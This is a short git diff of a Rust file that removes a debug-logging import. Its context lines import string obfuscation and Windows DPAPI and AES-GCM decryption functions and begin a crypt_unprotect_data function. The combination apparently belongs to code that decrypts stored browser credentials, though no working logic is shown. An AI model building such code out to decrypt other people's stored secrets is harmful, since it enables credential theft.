@@ -9,7 +9,6 @@ use json::parse;
 use obfstr::obfstr as s;
 use windows_sys::Win32::Foundation::{LocalFree};
 use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
-use crate::log_debug;
 
 pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
     let mut in_blob = CRYPT_INTEGER_BLOB {
